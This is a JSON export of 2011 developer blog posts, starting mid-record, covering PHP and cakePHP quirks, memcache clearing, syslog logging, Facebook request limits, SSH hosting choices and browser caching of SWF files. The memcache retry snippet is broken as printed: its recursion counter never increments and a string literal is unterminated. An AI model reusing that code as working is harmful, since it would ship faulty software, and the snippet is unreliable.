href=\"http://code.google.com/p/fbug/issues/detail?id=4327\" target=\"_blank\">posted an issue</a> on the Firebug bug tracker. I hope it will get resolved soon. Until then, I'm using Live HTTP Headers to capture and replay the requests I need to debug.</p>\n<h4>Update</h4>\n<p>Seems like the bug come from Firefox internals and not Firebug. More details <a href=\"http://groups.google.com/group/mozilla.dev.platform/browse_thread/thread/1faabb0d0a8d26f7?hl=en\" target=\"_blank\">on this post.</a></p>\n<p>Edit : Seems to be <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=649338\" target=\"_blank\">resolved in Firefox</a>, will be available in next release (8.0 I guess).</p>",
  "publish_start": "2011-04-04 18:14:49",
  "slug": "firebug-1-7-moving-headers-raw-post-source"
}, {
  "id": 271,
  "name": "Multiple foreach() with references in php",
  "text": "<p>It took me a couple of hours to debug : I had an array with values that shouldn't be here, values from another part of the application, and I couldn't figure out where that came from.</p>\n<p>Well, it turns it was part of a documented feature of PHP :</p>\n<blockquote cite=\"http://fr.php.net/manual/en/control-structures.foreach.php\">\n<p>Unless the array is referenced, foreach operates on a copy of the specified array and not the array itself. foreach has some side effects on the array pointer. Don't rely on the array pointer during or after the foreach without resetting it. Reference of a $value and the last array element remain even after the foreach loop. It is recommended to destroy it by unset().<cite class=\"author\">php.net</cite></p>\n</blockquote>\n<p>My code was as simple as :</p>\n<pre><code lang=\"php\">$newArray = array();<br />$newArray2 = array();<br />foreach($list as $key =&gt; &amp;$data) {<br />\t$newArray[] = $data;<br />}<br />foreach($list2 as $key =&gt; &amp;$data) {<br />\t$newArray2[] = $data;<br />}</code></pre>\n<p>This resulted in the latest index of <code>$newArray</code> being set to one of <code>$list2</code> values (didn't know exactly which). This is really counter intuitive.</p>",
  "publish_start": "2011-04-05 13:45:34",
  "slug": "multiple-foreach-references-php"
}, {
  "id": 272,
  "name": "Memcache keys not getting saved correctly",
  "text": "<p><em>Update : We were initially blaming Memcache not correctly setting/getting keys. We should instead have blamed him for being over-zealous in clearing its list. See bottom of post for details.</em></p>\n<p>Today we were having a bit of an issue with memcache. We had to write a thousand keys into it, reading them from a JSON file.</p>\n<p>This code had been running happily on our server for the past two weeks. But as the number of keys increased, we came to spot that some keys seemed to be randomly cleared.</p>\n<p>After further investigation (and a lot of hours), it appears that the keys were simply not set at all, or set to an empty/false value. This was really strange because it occured inside a loop on our JSON file, and never occurs for the same keys, nor everytime.</p>\n<p>We took our server under high stress, forcing it to reload data very often, to trigger the bug once more. After a lot of test, we gather some more data, but nothing really came out. The missed keys were really random.</p>\n<p>Finally, we decided to code a fast and dirty fix, until we found a better solution. Basically, we simply checks that the value is correctly saved after saving it, and if not, we retry. And we do so recursively.</p>\n<pre><code lang=\"php\">function set($key, $val, $recursionLevel = 0) {<br />\tCache::write($key, $val);<br />\tif (Cache::read($key)===false) {<br />\t\tif ($recursionLevel&gt;10) die('Possible infinite recursion);<br />\t\t$this-&gt;set($key, $val, $recursionLevel);<br />\t}<br />}</code></pre>\n<p>Note, that this will not work if one of your values is defined as false, otherwise you'll end up in an infinite loop.</p>\n<h4>Update</h4>\n<p>Well, the problem kept sporadically popping. And we finally found the REAL culprit.</p>\n<p>Cake provides multiple <code>Cache </code>config, using different settings. One would use a special config to set different cache duration. Each setting would use a different key prefix.</p>\n<p>Unfortunatly, memcache has no way of finding keys starting with a special prefix. So when we do a <code>Cache::clear()</code>, it just wipes clear the whole memcache keys, no matter what config you specify.</p>\n<p>We were running two different websites using the same memcache server, and when doing a clear on one website, it cleared keys on the second one as well.</p>\n<p>We finally started one memcache server per site.</p>",
  "publish_start": "2011-04-08 18:26:11",
  "slug": "memcache-keys-save-correctly"
}, {
  "id": 273,
  "name": "Losing session on each request with cakePHP and Chrome",
  "text": "<p>I finally found solution for one of the more tenacious bug I ever encountered. Share the joy !</p>\n<p>I had a website working perfectly under Firefox but when browsing using Chrome, I noticed that my Session gets regenerated on each page load. <strong>Constantly</strong>. Creating hundred and hundred of useless session files.</p>\n<h4>And only with Chrome.</h4>\n<p>Since when using a browser should change the server behavior ? Well I don't exactly know what Chrome is doing with the <code>referer</code> but it seems that it is altering it in some ways.</p>\n<p>And cakePHP forces the setting of <code>session.referer_check</code> to <code>true</code>, thus checking that multiple requests with the same PHPSESSID comes from the same url.</p>\n<p>As one posted on php.net :</p>\n<blockquote>\n<p>If you have a value specified for session.referer_check you may run into difficulty when someone accesses your site and attempts to log in with a mis-capitalized URL.  The logon will fail because any calls to session_start() will result in the existing session being trashed and a new one being created.  This becomes a bigger problem when the logon is followed by a header(\"Location: ...\") redirect, because the session_start() at the top of the page will fail.</p>\n</blockquote>\n<p>Those two settings combined, and you got a hell of a mess. I first found a quick fix by forcing the setting of <code>session_start()</code> in <code>app/webroot/index.php</code>. But after more <a href=\"http://www.nirvaat.com/blog/web-development/session-issue-in-iis-with-cakephp/\">reading </a>and <a href=\"http://freetofeel.com/page15/\">debugging </a>I finally found the culprit.</p>\n<h4>Hacking your way through the fix</h4>\n<p>There is no easy way to prevent cake from setting this setting, but you can define your own session handler in the <code>Session.save</code> configure key.</p>\n<p>Just create file named <code>session_custom.php</code> in <code>app/config/</code> and set <code>Configure::write('Session.save', 'session_custom');</code> in your <code>core.php</code> file.</p>\n<p>And in that file, just drop the following lines (copy/paste from <code>cake_session.php</code>)</p>\n<pre><code lang=\"php\">ini_set('session.referer_check', '');                    // Killing this f***ing config that was causing so much trouble with Chrome<br />ini_set('session.use_trans_sid', 0);                    // No session id in url<br />ini_set('session.name', Configure::read('Session.cookie'));    // Using custom cookie name instead of PHPSESSID<br />ini_set('session.cookie_lifetime', $this-&gt;cookieLifeTime);    // Cookie like time, depending on security level<br />ini_set('session.cookie_path', $this-&gt;path);                // Cookie path</code></pre>\n<p> </p>",
  "publish_start": "2011-04-13 23:19:56",
  "slug": "losing-session-request-cakephp-chrome"
}, {
  "id": 274,
  "name": "Parsing error in cakePHP view for empty file",
  "text": "<p>As a convention, I never write the closing PHP tag at the end of my php files. It helps in avoiding the \"header already sent\" error when dealing with cookie/sessions.</p>\n<p>However, today cake complains about</p>\n<pre><code lang=\"php\">Parse error: syntax error, unexpected $end in /var/www/website/app/views/players/default.ctp on line 1</code></pre>\n<p>My <code>default.ctp file</code> only contain the following content :</p>\n<pre><code lang=\"php\">&lt;?php<br /></code></pre>\n<p>It took me a couple of minutes to fix it. I only added an empty line after the opening tag, so it now read :</p>\n<pre><code lang=\"php\">&lt;?php<br /><br /></code></pre>\n<p>The first statement was a perfectly valid php file, but somehow it makes cakePHP fail.</p>\n<p>I didn't have time to investigate on it further, nor submit a bug report (because it may well be coming from my custom app, not cake itself) but I plan to.</p>",
  "publish_start": "2011-04-20 10:28:49",
  "slug": "parsing-error-cakephp-view-empty-file"
}, {
  "id": 275,
  "name": "Custom logging system for cakePHP",
  "text": "<p>I do love cakePHP, but sometimes it can get tricky to get it to do exactly what you want.</p>\n<p>For our big app, we needed to stop using the builtin logging system to take advantage of the syslog and log analyzer tools we had.</p>\n<p>At first I got confused by the various log files, but after reading the cake core code, it (kinda) makes sense. Let me explain it to you.</p>\n<h4>CakeLog and FileLog</h4>\n<p><code>CakeLog </code>is the cake static class that handles all the log actions. You can call it yourself statically using <code>CakeLog::write()</code>, but cake also calls it itself when an error is reported.</p>\n<p><code>CakeLog </code>internally write its content using the FileLog. This <code>FileLog </code>writes its content to files located in <code>app/tmp/logs</code>.</p>\n<h4>Writing errors to the syslog instead</h4>\n<p>We didn't want our logs to be saved in <code>app/tmp/logs</code> for three mains reasons :</p>\n<ol>\n<li>Those files gets deleted on every deploy we did (this was how our deployment system works)</li>\n<li>Those files can get very big very fast</li>\n<li>Our app was distributed accross several servers, meaning that each server had its own set of log files</li>\n</ol>\n<p>Instead, we wanted them to be written to the syslog where they would be intercepted and stored in our main log analyzer.</p>\n<p>To do so, we wrote a simple <code>SysLog </code>class to use instead of the <code>FileLog</code>. Here it is :</p>\n<pre><code lang=\"php\">class SysLog {<br />\t/**<br />\t*    Writes a log to the syslog<br />\t*    \\param    $type    Either a numerical constant or a string<br />\t*    \\param    $message    Message to log<br />\t**/<br />\tpublic function write($type, $message) {<br />\t\t// We \"fix\" CakeLog that passes severity as a string<br />\t\tif (is_string($type)) {<br />\t\t\t// Mapping string to syslog priorities<br />\t\t\t$priorities = array(<br />\t\t\t\t'debug'    =&gt; LOG_DEBUG,<br />\t\t\t\t'info'        =&gt; LOG_INFO,<br />\t\t\t\t'notice'    =&gt; LOG_NOTICE,<br />\t\t\t\t'warning'    =&gt; LOG_WARNING,<br />\t\t\t\t'error'    =&gt; LOG_ERR,<br />\t\t\t\t'default'    =&gt; LOG_NOTICE<br />\t\t\t);<br />\t\t\t$type = (array_key_exists($type, $priorities)) ? $priorities[$type] : $priorities['default'];<br />\t\t}<br />\t\t// Writing to syslog<br />\t\topenlog(false, 0, LOG_LOCAL7);<br />\t\tsyslog($type, trim($message));<br />\t\tcloselog();<br />\t}<br />}</code></pre>\n<p>Place this file in <code>app/lib/log/sys_log.php</code>. Then, in <code>app/config/bootstrap.php</code>, place the following code :</p>\n<pre><code lang=\"php\">CakeLog::config('default', array('engine' =&gt; 'SysLog'));</code></pre>\n<p>It is important that you place the <code>CakeLog::config()</code> call in<code> bootstrap.php</code> and not in <code>core.php</code> because of the way cake actually loads its internal. I also manually defined the syslog facility as LOCAL7, but you can change it to whatever you want or even update the code so the actual facility can be passed as a parameter of the <code>CakeLog::config()</code> call (actually, that's how it's done in my real code, but I didn't want to overcomplicate the example).</p>\n<p>Also, note that I added a special code to handle the way CakeLog passes parameters to the SysLog. CakeLog passes the severity as a string, so we convert it back to the PHP constants.</p>\n<p>With this code, all your logs will now be routed to the syslog, and your <code>app/tmp/logs</code> directory will no longer grow in size (instead, that will be your <code>/var/logs/syslog</code> :) )</p>\n<h4>Where are my errors loggued now ?</h4>\n<p>Well, your errors are loggued to the syslog. But cake defines its own error handler that will reformat the error thrown by PHP, and reroute it to the <code>CakeLog</code>. In effect, it means that all errors with similar severity will be grouped (<code>E_PARSE</code>, <code>E_ERROR</code>, <code>E_CORE_ERROR</code>, etc will be loggued as<code> LOG_ERROR</code>). Also, cake will parse and reformat the message to log. It can be problematic if you rely on your PHP config to correctly parse your logs because you won't have the expected output.</p>\n<p>Hopefully, cake provides a way to disable this error handler, but it was very tricky to find and even more tricky to correctly use. I won't spend too much time on all the details, but what you have to know is :</p>\n<ol>\n<li>You have to define a <code>define('DISABLE_DEFAULT_ERROR_HANDLING', true);</code> in order to disable the cake error handler and use the default PHP one</li>\n<li>This call MUST be done before your <code>Configure::write('debug')</code> call otherwise it won't work</li>\n<li>You also have to define a <code>Configure::write('log', E_ALL &amp; ~E_DEPRECATED);</code> for this to work but...</li>\n<li>You can't define both the debug and the log value in the same call using an array, you have to define them in two different calls <code>debug </code>then <code>log</code></li>\n</ol>\n<p>So, finally, here is the final working configuration :</p>\n<p>In <code>app/config/core.ph</code>p :</p>\n<pre><code lang=\"php\">Configure::write('log', E_ALL &amp; ~E_DEPRECATED);<br />define('DISABLE_DEFAULT_ERROR_HANDLING', true);<br /></code></pre>\n<p>And in<code> app/config/bootstrap.php</code> :</p>\n<pre><code lang=\"php\">CakeLog::config('default', array('engine' =&gt; 'SysLog'));</code></pre>\n<h4>Final words</h4>\n<p>I wrote this blog post because I got hit by this problem. Twice. I didn't bloggued about it the first time, so a few weeks later when I had to change some config values in my bootstrap.php and core.php I forgot about the specific order of loading things. It took me a couple hours to figure it out again.</p>\n<p>So, to avoid running into the same issue some months from now, I took some time to write it down, and hopefully I'll help some of you too.</p>",
  "publish_start": "2011-05-05 16:01:26",
  "slug": "custom-logging-system-cakephp"
}, {
  "id": 276,
  "name": "json_decode casts strings to floats",
  "text": "<p>The PHP function <a href=\"http://fr.php.net/manual/en/function.json-decode.php\">json_decode</a> takes a JSON string as argument and return a decoded array/object .</p>\n<p>However, when passing an argument that has nothing to do with a JSON string, the function was supposed to return null. But, in practice, this didn't go so well.</p>\n<h4>Passing a string</h4>\n<p>Here's an example :</p>\n<pre><code lang=\"php\">$foo = 'foo';<br />$bar = json_decode($foo);<br />// $bar is nothing,<br />echo (is_null($bar)) ? \"This is null\" : \"This is not null\";</code></pre>\n<h4>Passing a float</h4>\n<p>Here, we try to decode a string. The function rejects it and returns null.</p>\n<pre><code lang=\"php\">$foo = 0.4;<br />$bar = json_decode($foo);<br />// $bar is a float<br />echo (is_float($bar)) ? \"This is a float\" : \"This is not a float\";</code></pre>\n<p>Here, we pass a floating number. And the function returns... a floating number. Wait, what ?</p>\n<p>This is weird, I expected it to return null, once again. But maybe it's correct and the JSON specs says so. I didn't check, actually.</p>\n<h4>Passing a string thats looks like a float</h4>\n<p>But the next example is even better :</p>\n<pre><code lang=\"php\">$foo = '0.4';<br />$bar = json_decode($foo);<br />// $bar is also a float, even if $foo was a string<br />echo (is_float($bar)) ? \"This is a float\" : \"This is not a float\";</code></pre>\n<p>This time I pass a string as a parameter (like example 1) but got a float as a result (like example 2).</p>\n<p>Well, this time I'm sure that can't be the correct behavior.</p>\n<h4>How to deal with it</h4>\n<p>I finally wrote a little wrapper for json_decode to handle those strange cases :</p>\n<pre><code lang=\"php\">function my_json_decode($var) {<br />\t$decodedValue = json_decode($var, true);<br />\treturn is_array($decodedValue) ? $decodedValue : $var;<br />}</code></pre>\n<p>This will check that the result of the JSON decoding is an array, and if not (meaning the original string was not a JSON string), it will return the original string.</p>",
  "publish_start": "2011-05-06 11:28:45",
  "slug": "json-decode-casts-strings-floats"
}, {
  "id": 277,
  "name": "Another PHP casting weirdness",
  "text": "<p>Second weird PHP behavior behavior of the day :</p>\n<pre><code lang=\"php\">$foo = false;<br />echo $foo['bar']; // Ouptuts nothing, but doesn't throw an error either</code></pre>\n<p>Strange. I try to read an undefined index (<code>false </code>is not an array), but PHP doesn't complain. That's weird.</p>\n<pre><code lang=\"php\">$foo = true;<br />echo $foo['bar']; // Throws an error</code></pre>\n<p>This time, PHP tells me that the index is not defined and throws an error. Wait, what ?</p>\n<p>Apparently, this is the intended behavior, but it does seem a bit strange...</p>",
  "publish_start": "2011-05-06 14:25:56",
  "slug": "php-casting-strangeness"
}, {
  "id": 278,
  "name": "Hard limits using FB.ui to post Requests",
  "text": "<p>I hate Facebook documentation. All pages seems out of date, displaying wrong function signature, obsolete parameters, documentation link pointing to 404 pages, etc, etc.</p>\n<p>I've lost some hours debugging those calls, finding whatever hard limit Facebook forced on some of the arguments.</p>\n<p>Let us write a very basic example code :</p>\n<pre><code lang=\"js\">FB.ui({<br />\t'method' : 'apprequests',<br />\t'display': 'iframe',<br />\t'message' : \"Hey, this Request is awesome, just accept it, ok ?\",<br />\t'title' : \"Awesome request incoming\",<br />\t'filters' : [<br />\t\t{ \"name\" : \"Some friends\", \"user_ids\" : [ \"97841578\", \"548673131\", \"[...]\"]  },<br />\t\t{ \"name\" : \"Some other friends\", \"user_ids\" : [ \"97841578\", \"56867134\", \"[...]\"]  },<br />\t]<br />});</code></pre>\n<p>This should open a Request popup with the custom title and message, as well as provide a list of friends that you can filter based on two criterias : \"Some friends\" and \"Some other friends\".</p>\n<h4>What will go wrong</h4>\n<p>First, you have to know that both the message and title have a character limit. If you go over it, the popup will simply display something like \"An error occurred, blah blah blah\".</p>\n<p>After some fiddling, I discovered that the limit is 50 chars for the title and 255 for the message.</p>\n<p><del>Also, there is no limit (as far as I know) to the limit of custom filters you can set.</del> <ins>See update below.</ins> But there is one to the max number of users you can define in a filter. And that number is 1000.</p>\n<p>This means that if my <code>user_ids</code> list for any of my custom filters contains more than 1000 users, the popup will fail. However, you can have as many filters with 999 users as you want.</p>\n<p>Took me a little while to find, and I thought that this could be shared.</p>\n<h4>Update</h4>\n<p>I found a new hard limit : You can't set more than 5 filters at a time. If you add one more, the Request popup will fail.</p>\n<h4>New Update</h4>\n<p>Also, if you define a callback, don't forget to <code>return true</code>. Otherwise Webkit will refuse to close the FB popup and you'll have to click twice for it to really close itself.</p>\n<h4>Update (bis repetita)</h4>\n<p>This one was pretty hard to find but if your filter contains a facebook id of someone that is not a friend of the currently loggued user, the filter will display nothing.</p>\n<p>In our app, we have a filter of \"Neighbors\" (as most social games do). But one of thoses neighbors removed the user from its friends, and we didn't update the neighbor list to reflect that, resulting in our \"Neighbors\" filter being empty.</p>",
  "publish_start": "2011-05-10 16:57:32",
  "slug": "hard-limits-fb-ui-post-requests"
}, {
  "id": 279,
  "name": "Finding the perfect SSH host",
  "text": "<p>I'm trying to find a company providing hosting capabilities. I have a strong set of pre-requisites.</p>\n<h4>Connected through SSH</h4>\n<p>I want the server to be accessible through SSH. I don't need http nor ftp acces on it.</p>\n<p>I'll host git, mercurial and subversion repositories on it, and will push(/pull) from(/to) them using ssh.</p>\n<p>So, I will need those softs installed, or at least enough power to install them (even locally).</p>\n<h4>Serving as an SSL tunnel</h4>\n<p>I also want to be able to create an SSH tunnel through this server. That way I could be securely connected from any wifi connection using SSL.</p>\n<p>The server should have a pretty reasonable bandwidth. I'd also wish to avoid having it hosted in France. Peering agreement between providers in France are getting uglier and uglier.</p>\n<h4>Secondary accounts for holding websites</h4>\n<p>If the same company also provides more conventional hosting, that also could be an important part of my choice.</p>\n<p>What I would like is something as flexible as allowing some websites to use Apache, and others Lighttpd. Even being able to configure it per subdomain.</p>\n<p>Some sites would be running PHP, others Rails, even node.js. I want enough freedom to configure it and the associated inner config (lighttpd.conf, php.ini).</p>\n<p>I also want to be able to install secondary parts like mongoDB or memcache and having a full access to their configuration.</p>\n<h4>Pricing</h4>\n<p>Of course, the cheaper the better, but I know that such an amount of freedom and features comes with its own price.</p>\n<p>Now, let's review some of the contestants I've picked</p>\n<h3>Alwaysdata</h3>\n<p>They were the first I <a href=\"http://www.alwaysdata.com/\">checked</a>. I heard quite a good thing about their service and reliability. They really seem to know what they're doing.</p>\n<p>I've tried their free 10Mo plan and am quite satisfied with it. Mercurial, git, subversion and quite a batch of others softs are already installed. They also have a pretty 10Mo/s awesome bandwith.</p>\n<p>I haven't tried their hosting plans, but they also seems nice. All default (shared) hosting provides php, perl, ruby and python.</p>\n<p>Their custom (managed dedicated server) provides almost anything you could want from lightty to memcache, but the price goes high with it to. 350€/month that is way too much I can afford for what I have in mind.</p>\n<p>On the other hand, they not only provide hosting but the whole support package along with hotline and custom installation.</p>\n<h3>Dreamhost</h3>\n<p>I'm fond of Dreamhost. I've used them for years. They do provide a very nice shared hosting, with a lot of options to configure. They even allow cronjob for their admin panel.</p>\n<p>And they are cheap, with a customer support very professional, I highly recommend them for your simple hosting needs.</p>\n<p>I haven't tested their dedicated server version, so can't really talk about it.</p>\n<p>However, the SSH capabilities of the shared hosting are quite small. They have git, svn and mercurial installed, but the version are quite outdated. Even the python version running mercurial was out of date.</p>\n<p>You can however download and install them yourself on your account (which I did), but it is not as full featured as alwaysdata.</p>\n<p>Their bandwith is also capped to 1Mo/s.</p>\n<h3>OVH</h3>\n<p>Haven't tested yet, but their <a href=\"https://www.ovh.com/fr/vps/\">VPS offer</a> seems nice for as low as 60€/year.</p>\n<p>I have tried the shared hosting offer of OVH before and am mitigated. On one hand I like some of their features like the automatic backup of your ftp files, on the other hand their administration panel is a total mess and accessing the server through SSH is not that simple.</p>\n<p>I've heard they have a 10Mo/s bandwith. I'll try to get more information on this.</p>\n<h3>Gandi</h3>\n<p>Gandi is an amazing registrar (both technically and ethically). I've never had any issues with their service and can only praise their technical support.</p>\n<p>Some years ago, they started doing hosting too. I tested it back then and was quite disapointed. This was horribly slow and crashed.</p>\n<p>I never tried it again since then. I think they improved their service, and I just asked a test account. Their VPS offer is interesting, the server is pretty decent from what I can read and the price is still in my range (12€/month).</p>\n<p> </p>\n<p><em>I'll continue this review later, with more information. If you, reader, have any suggestion on a good host filling my need, feel free to post it in the comments, I'll review it.</em></p>",
  "publish_start": "2011-05-10 21:44:58",
  "slug": "finding-perfect-ssh-host"
}, {
  "id": 280,
  "name": "Whitelisting keys of an array",
  "text": "<p>I needed to validate an array create from POSTed data. I wanted to discard all keys from this array that I didn't want.</p>\n<p>Actually, I wanted to whitelist the array, and only keep keys that were on my whitelist.</p>\n<p>Here is the litte snippet that does it :</p>\n<pre><code lang=\"php\">/**<br />*    Keep only specified keys of the specified array. This is useful to whitelist an array of parameters.<br />*    \\param    $array        Original array<br />*    \\param    $whitelist        Array of keys to keep.<br />**/<br />function array_whitelist($array, $whitelist = array()) {<br />\treturn array_intersect_key($array, array_flip($whitelist));<br />}</code></pre>\n<p> </p>",
  "publish_start": "2011-05-11 12:17:40",
  "slug": "whitelisting-keys-array"
}, {
  "id": 281,
  "name": "Missing bits of the official Facebook documentation",
  "text": "<p>As a complement to my post about FB.ui undocumented hard limit, here are some other parts that should be in the documentation.</p>\n<h4>Custom html tag</h4>\n<p>You have to add <code>xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns:og=\"http://opengraphprotocol.org/schema/\"</code> to your main <code>&lt;html&gt;</code> element.</p>\n<p>If you don't, the <code>&lt;fb:like&gt;</code> (and possibly other <code>&lt;fb:*&gt;</code> elements) won't work in IE. I guess those unorthodox tags won't be interpreted by IE until you define the correct xmlns.</p>\n<h4>Adding a #fb-root</h4>\n<p>You also have to add a <code>&lt;div id=\"fb-root\"&gt;&lt;/div&gt;</code> in your html code. I guess the Javascript API use it for some stuff, but I don't really know why.</p>\n<p>The Javascript SDK logs an error message asking for this missing element if you don't have it.</p>",
  "publish_start": "2011-05-24 14:18:22",
  "slug": "missing-bits-official-facebook-documentation"
}, {
  "id": 282,
  "name": "Working on Wednesday #1",
  "text": "<p>Starting June 15th, I'll stop working at my day job for one day a week. Instead, I'll use this time to work on personal projects.</p>\n<p>After more than 3 years of freelancing, I've been working full time for a very nice young company (making a great social game) for the past 6 months. Today, with the public release of the game, I find myself missing freelance.</p>\n<p>I liked being able to sleep when too tired, working late at night when really productive, reading a log of blog posts on various subjects, learning new cool stuff other did. I kinda miss that on my new job.</p>\n<p>Sure our project is damn cool and I really like working on it. I learn a lot, in fields that I was interested in but never had the chance to explore (server administration, CDN configuration, memcache, large number of users, etc).<br />But on the other hand, I'm almost only doing server-side work. I relatively interesting part of Javascript (nothing fancy) and a really small part of CSS.</p>\n<p>And I miss all that front-end part of the job. I also get kind of tired of using cakePHP. I do like it a lot, but the more I write PHP and read posts about Ruby, the more I want to switch.</p>\n<h4>Working 4 days a week</h4>\n<p>I finally made a deal with my boss, for not working on Wednesday. I want to use that time to relax and learn all those things.</p>\n<p>The last time I was working full time for a company, I finally quit because I thought I was waaaaaaay late behind all the current tech trends. It took me a couple of month to learn the cool stuff I'm armed with today : jQuery and cakePHP.</p>\n<p>This time, I want to re-learn a whole new world, a better one. Using all I learnt those past years to make a fresh start.</p>\n<h4>What I want to learn</h4>\n<p>There's a lot of things I would love to learn, unordered :</p>\n<ul>\n<li><code>vim</code> : I want to be able to write code on any machine, easily, and fast</li>\n<li><code>ruby</code> / <code>rails</code> : I want to learn Ruby to be able to fully understand Rails. I have a pretty strong knowledge of cakePHP so I guess Rails won't be too hard for me.</li>\n<li><code>git</code> : I like Mercurial, but <code>git</code> seems to be the de-facto VCS for all the social geeks and rails coder, so why not ?</li>\n<li><code>sass</code> and <code>haml</code> : Those seems awesome, and were part of the things that make me want to try ruby. Writing CSS and HTML in a non-painful way. I already want to write modules (or are they called gems?) to enhance them, adding webperf optimisations on the fly (creating sprites/dataURI, optimizing selectors, etc).</li>\n<li>CoffeeScript, Kafeeine or equivalent : Following the logic behind sass, I want to be able to write Javascript easily. I always encounter issues when my jQuery code became too big, everything gets tangled together. Backbone.js seems interesting too. I'll have to test all those solution.</li>\n<li><code>nodejs</code> : Because it looks kinda fun. I haven't really understand how it works yet, but it looks fun anyway :)</li>\n<li>TDD : This is not a technology, but a way of writing code that I want to learn. I tried it in cakePHP, but I spent so much time writing tests (and making them work), to finally change the implementation and broke the tests that I finally gave up. I still have to understand HOW to do it properly. I thought I read somewhere that this principle was directly intergrated into Ruby (or was it Rails ?) development.</li>\n</ul>\n<p>To summarize, I want to learn the good tools that will let me focus on the project(s) I want to make, not fighting to use tools to bend them to my needs. Writing \"uncompiled\" css, html or Javascript and having some automation tool to automatically transform it in the most usable version to use only.</p>\n<p>Also, I have already written a pretty decent cakePHP CMS, with a full featured admin panel that I used when making website for clients. I wanted to put it open source for all to enjoy but never really knew how to do it. I don't yet know if I want to create a whole new CMS in Rails, or if I'll do custom dev for each project, or use (and enhancing) existing CMS.</p>\n<h4>That's all for now</h4>\n<p>I might have forgotten stuff (I'd want to try couchDB/mongoDB, getting better at using Linux everyday), but here is a dump of all the things I want to achieve in the next 6 month, one day per week. I'll try to post a summary of what I learned each Wednesday, hoping that it would help others (I know I'll surely enjoy looking back at it later).</p>",
  "publish_start": "2011-05-25 19:43:34",
  "slug": "working-wednesday-1"
}, {
  "id": 283,
  "name": "PHP sessions and the Pragma:no-cache header",
  "text": "<p>You may have seen the <code>Pragma:no-cache</code> response header on various website (if you're that kind of guy actually reading HTTP response headers...).</p>\n<p>What you may not know is that this Header doesn't actually exists. The Pragma header <a href=\"http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.32\" target=\"_blank\">is supposed to be</a> <strong>Request </strong>header, not a <strong>Response </strong>header.</p>\n<p>It is not only useless, it may also trigger strange caching bugs in IE6.  I'm sure you know what kind of IE6 quirks I'm talking about. The best  is to remove it, just to be sure.</p>\n<p>This is a common misconception (I myself didn't know that before reading <a href=\"http://www.mnot.net/cache_docs/\" target=\"_blank\">this excellent caching tutorial</a>), and that header is still returned in a lot of request.</p>\n<p>For example, if you set your <code>session.cache_limiter</code> to <code>nocache </code>in your <code>php.ini</code>, then PHP will send this header (as defined in the <a href=\"http://ca.php.net/manual/en/function.session-cache-limiter.php\" target=\"_blank\">session_cache_limiter</a> doc. This is obviously wrong.</p>\n<p>It also adds a weird <code>Expires: Thu, 19 Nov 1981 08:52:00 GMT</code> header. I don't like it as it allow easy fingerprinting of the server-side technology used.</p>\n<p>I changed my <code>session.cache_delimiter</code> value to <code>private_no_expire</code> to return better headers.<br />First, it removed the useless <code>Pragma</code>, but it also removes the <code>Expires </code>header (<code>Cache-Control</code> is enough).</p>",
  "publish_start": "2011-05-30 19:45:58",
  "slug": "php-sessions-pragma-cache-header"
}, {
  "id": 287,
  "name": "SWF caching issues accross browsers",
  "text": "<p>Here are some quick notes on various browser caching behavior. I was fiddling with Wireshark to optimise my caching strategy and found some quirks one should be aware of.</p>\n<p>First, let's define some reload vocabulary.</p>\n<ul>\n<li><strong>initial load</strong> is the first time the page is loaded, when the cache is empty.</li>\n<li><strong>hard reload</strong> is the classical reload. Clicking the Reload icon, or pressing Ctrl+R / F5.</li>\n<li><strong>link reload</strong> is when the page is loaded again after you click on a link to it</li>\n<li><strong>soft reload</strong> will be loading the page again by pressing enter in the address bar</li>\n<li><strong>navigational reload</strong> is the reloading of a page that occurs while using the previous/next buttons.</li>\n</ul>\n<p>For the rest of this blog post, we will assume an HTML page loading the same .jpg file multiple times and the same swf file multiple times too (we will use both IE specific and general swf markup).</p>\n<p>The html itself is not cached.</p>\n<p>Also, all those static assets will have a <code>Cache-Control:max-age=29030400</code> header.</p>\n<p>All the network tests have been made using Wireshark.</p>\n<h4>Chrome</h4>\n<p><strong>Initial load</strong> : Download of jpg and swf once each. Perfect.</p>\n<p><strong>Link reload &amp; navigational reload</strong>: Nor jpg nor swf is loaded again. Perfect.</p>\n<p><strong>Soft reload &amp; hard reload </strong>: The jpg is downloaded again but not the swf. Chrome sends a <code>Cache-Control:max-age=0</code> header to the jpg request, to force loading it again.</p>\n<p>Reloading images is a standard behavior on images, but I wouldn't have expected it on soft reloads.</p>\n<h4>Safari 5 Win</h4>\n<p>Safari behaves much like Chrome, with one important difference. It does not cache swf files at all.</p>\n<p><strong>Initial load</strong> : The jpg gets downloaded perfectly, but the swf gets downloaded multiple times, one per instance.</p>\n<p><strong>Link reload &amp; navigational reload</strong> : The jpg is correctly fetched from cache, but the swf are all downloaded again. No swf is ever cached.</p>\n<p><strong>Soft reload &amp; hard reload</strong> : Much as Chrome, Safari forces the reload of the jpg here. As you might guess, it also reload all the swf too, multiple times.</p>\n<p>It means that Safari 5 does not cache any swf file at all. That's pretty impressive.</p>\n<p>This same caching bug is talked about <a href=\"http://don.blogs.smugmug.com/2008/04/04/nasty-bug-safari-doesnt-cache-stuff/\" target=\"_blank\">on this other blog</a>. I've also tried including flash files from within another flash file (much like the <a href=\"http://www.alistapart.com/articles/flashsatay\">Satay method</a>). The results are the same : no swf flash is ever cached, even in the same html request.</p>\n<p>It is supposed to have been fixed in Safari Mac (anyone can confirm this? I don't own a Mac) but the issue is still here on Safari Windows.</p>\n<h4>IE6, IE7 and IE8</h4>\n<p>IE6, IE7 and IE8 behaves the same here. They have a less severe version of the bug than Safari 5. At the time of writing I didn't have IE9 to test on it.</p>\n<p><strong>Initial load</strong> : Same bug as Safari here. The swf are downloaded multiple times, once for each instance. The jpg is only download once.</p>\n<p><strong>Link reload, navigational reload and soft reload</strong> : This time, everything is fetched from the cache. Actually, even the html is seems fetched from cache (I didn't investigate that much)</p>\n<p><strong>Hard reload</strong> : Html and jpg are fetched from the server, swf file stays in the cache.</p>\n<p>It appears that (surprisingly) IE behaves quite well. Its caching behavior is more aggressive than the others (soft reload is really soft). However, it still have a nasty side effect of loading swf files multiple times on the same page. Shouldn't happen a lot in the real world, but still nice to know.</p>\n<h4>Firefox 4.0</h4>\n<p><strong>Initial load</strong> : No issue arising. It does fetch each resource once.</p>\n<p><strong>Link reload, navigational reload and soft reload</strong> : Fetches everything from cache, nice.</p>\n<p><strong>Hard reload</strong> : Re-request jpg and swf files by adding a <code>Cache-Control: max-age=0</code> request header. This feels like the expected 